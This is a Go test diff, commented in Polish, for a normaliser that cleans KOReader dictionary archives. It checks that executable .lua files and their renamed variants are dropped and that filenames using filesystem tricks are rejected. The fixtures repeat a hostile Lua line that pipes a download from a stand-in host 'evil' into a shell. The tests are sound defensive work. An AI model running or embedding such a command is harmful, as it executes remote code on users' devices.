@@ -185,24 +185,47 @@ func TestDictNormalizeDeterministic(t *testing.T) {
 	}
 }
 
-// Pliki .lua KOReader wykonuje jako kod (fix_html_func) — muszą zniknąć.
+// Pliki .lua KOReader wykonuje jako kod (fix_html_func) — muszą zniknąć, także w
+// wariantach zapisu, które po drodze (FAT, wielkość liter, podwójne rozszerzenie) dają .lua.
 func TestDictDropsLua(t *testing.T) {
 	files := withPrefix("d/", starDict("d", "D"))
-	files["d/d.lua"] = []byte("os.execute('curl evil|sh')")
+	for _, n := range []string{"d/d.lua", "d/d.LUA", "d/d.Lua", "d/d.lua.gz", "d/d.lua.dz", "d/README", "d/LICENSE", "d/run.sh", "d/x.so"} {
+		files[n] = []byte("os.execute('curl evil|sh')")
+	}
 	files["d/.DS_Store"] = []byte("x")
 	files["__MACOSX/d/._d.ifo"] = []byte("x")
 	files["d/d.css"] = []byte("b{}")
+	files["d/res/a.png"] = []byte("png")
 	got, meta, err := normalize(t, zipOf(t, files), "D")
 	if err != nil {
 		t.Fatal(err)
 	}
+	var have []string
 	for n := range got {
-		if strings.HasSuffix(n, ".lua") || strings.Contains(n, "DS_Store") || strings.Contains(n, "MACOSX") {
-			t.Errorf("w wyniku został %s", n)
-		}
+		have = append(have, n)
 	}
-	if got["D/d.css"] == nil || meta.Dropped != 1 {
-		t.Errorf("css ma zostać, lua policzone: dropped=%d, wpisy=%v", meta.Dropped, got)
+	sort.Strings(have)
+	want := []string{"D/d.css", "D/d.dict.dz", "D/d.idx", "D/d.ifo", "D/res/a.png"}
+	if strings.Join(have, "|") != strings.Join(want, "|") {
+		t.Errorf("wpisy %v, chcę %v", have, want)
+	}
+	if meta.Dropped != 9 {
+		t.Errorf("pominięte: %d, chcę 9", meta.Dropped)
+	}
+}
+
+// Nazwy, które FAT/NTFS skracają do .lua albo zmieniają, odrzucamy w całości.
+func TestDictRejectsFilesystemTricks(t *testing.T) {
+	bad := []string{
+		"d/d.lua.", "d/d.lua ", "d/d.lua. .", "d/a:b.ifo", "d/d.lua:x", "d/d*.idx", "d/d?.idx",
+		"d/<d>.ifo", "d/d|.ifo", "d/sub./d.ifo", "d/d\x01.ifo", "d/d\x7f.ifo",
+	}
+	for _, n := range bad {
+		files := withPrefix("d/", starDict("d", "D"))
+		files[n] = []byte("x")
+		if _, _, err := normalize(t, zipOf(t, files), "D"); err == nil {
+			t.Errorf("%q przyjęte", n)
+		}
 	}
 }
 
